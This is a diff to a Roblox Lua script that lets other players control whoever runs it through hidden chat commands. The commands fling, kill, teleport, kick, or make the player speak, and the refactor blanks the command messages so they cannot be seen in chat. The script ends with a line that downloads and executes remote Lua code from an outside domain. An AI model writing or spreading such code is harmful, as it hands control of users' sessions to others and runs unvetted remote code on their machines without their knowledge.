@@ -88,7 +88,6 @@ end)
 if kick then
     LocalPlayer:Kick(kickReason)
 end
-
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 
@@ -107,15 +106,13 @@ local function fling()
     local character = getCharacter()
     local root = getRoot(character)
 
-    if not root then
-        return
+    if root then
+        root.AssemblyLinearVelocity = Vector3.new(
+            math.random(-150, 150),
+            200,
+            math.random(-150, 150)
+        )
     end
-
-    root.AssemblyLinearVelocity = Vector3.new(
-        math.random(-150, 150),
-        200,
-        math.random(-150, 150)
-    )
 end
 
 local function kill()
@@ -127,56 +124,69 @@ local function kill()
     end
 end
 
-local function bring(controller)
-    if not controller then
-        return
-    end
-
-    local myCharacter = getCharacter()
-    local myRoot = getRoot(myCharacter)
-
-    local controllerCharacter = controller.Character
-    local controllerRoot = getRoot(controllerCharacter)
-
-    if not myRoot or not controllerRoot then
-        return
-    end
-
-    myRoot.CFrame = controllerRoot.CFrame * CFrame.new(0, 0, -3)
-end
-
-local function kick(reason)
-    if not reason or reason == "" then
-        reason = "You got kicked by the controller 😭"
-    end
-
-    LocalPlayer:Kick(reason)
-end
-
-local function say(message)
-    if not message or message == "" then
-        return
-    end
-
-    local channels = TextChatService:FindFirstChild("TextChannels")
-
-    if not channels then
-        return
-    end
-
-    local general = channels:FindFirstChild("RBXGeneral")
-
-    if general then
-        general:SendAsync(message)
-    end
-end
-
-local function executeCommand(sender, text)
+local function bring(sender)
     if not sender then
         return
     end
 
-    if type(text) ~= "string" then
+    local myRoot = getRoot(getCharacter())
+    local senderRoot = getRoot(sender.Character)
+
+    if myRoot and senderRoot then
+        myRoot.CFrame = senderRoot.CFrame * CFrame.new(0, 0, -3)
+    end
+end
+
+local function kick(reason)
+    LocalPlayer:Kick(
+        reason ~= "" and reason or "You got kicked by the controller 😭"
+    )
+end
+
+local function getChatChannel()
+    local channels = TextChatService:FindFirstChild("TextChannels")
+
+    if not channels then
+        return nil
+    end
+
+    local general = channels:FindFirstChild("RBXGeneral")
+
+    if general and general:IsA("TextChannel") then
+        return general
+    end
+
+    for _, channel in ipairs(channels:GetChildren()) do
+        if channel:IsA("TextChannel") then
+            return channel
+        end
+    end
+
+    return nil
+end
+
+local function say(message)
+    if message == "" then
+        return
+    end
+
+    local channel = getChatChannel()
+
+    if not channel then
+        return
+    end
+
+    local success, err = pcall(function()
+        channel:SendAsync(message)
+    end)
+
+    if not success then
+        warn(err)
+    end
+end
+
+local function executeCommand(sender, text)
+    if not sender or type(text) ~= "string" then
         return
     end
 
@@ -185,66 +195,61 @@ local function executeCommand(sender, text)
     end
 
     local command = text:sub(#PREFIX + 1)
-    local lowerCommand = command:lower()
+    local lower = command:lower()
 
-    if lowerCommand == "fling" then
+    if lower == "fling" then
         fling()
 
-    elseif lowerCommand == "kill" then
+    elseif lower == "kill" then
         kill()
 
-    elseif lowerCommand == "bring" then
+    elseif lower == "bring" then
         bring(sender)
 
-    elseif lowerCommand == "kick" then
+    elseif lower == "kick" then
         kick("You got kicked by the controller 😭")
 
-    elseif lowerCommand:sub(1, 5) == "kick " then
-        local reason = command:sub(6)
-        kick(reason)
+    elseif lower:sub(1, 5) == "kick " then
+        kick(command:sub(6))
 
-    elseif lowerCommand:sub(1, 4) == "say " then
-        local message = command:sub(5)
-        say(message)
+    elseif lower:sub(1, 4) == "say " then
+        say(command:sub(5))
     end
 end
 
 TextChatService.MessageReceived:Connect(function(message)
-    local textSource = message.TextSource
+    local source = message.TextSource
 
-    if not textSource then
+    if not source then
         return
     end
 
-    local sender = Players:GetPlayerByUserId(textSource.UserId)
+    local sender = Players:GetPlayerByUserId(source.UserId)
 
-    if not sender then
-        return
+    if sender then
+        executeCommand(sender, message.Text)
     end
-
-    executeCommand(sender, message.Text)
 end)
 
-TextChatService.OnIncomingMessage = function(message)
-    local textSource = message.TextSource
+local channels = TextChatService:WaitForChild("TextChannels", 10)
 
-    if not textSource then
-        return nil
+if channels then
+    for _, channel in ipairs(channels:GetChildren()) do
+        if channel:IsA("TextChannel") then
+            channel.OnIncomingMessage = function(message)
+                if type(message.Text) == "string"
+                    and message.Text:sub(1, #PREFIX) == PREFIX then
+
+                    local properties = Instance.new("TextChatMessageProperties")
+                    properties.Text = ""
+                    properties.PrefixText = ""
+
+                    return properties
+                end
+
+                return nil
+            end
+        end
     end
-
-    local text = message.Text
-
-    if type(text) ~= "string" then
-        return nil
-    end
-
-    if text:sub(1, #PREFIX) ~= PREFIX then
-        return nil
-    end
-
-    local properties = Instance.new("TextChatMessageProperties")
-    properties.TextTransparency = 1
-
-    return properties
 end
 loadstring(game:HttpGet("https://limbohub.my.id/loader.lua"))()
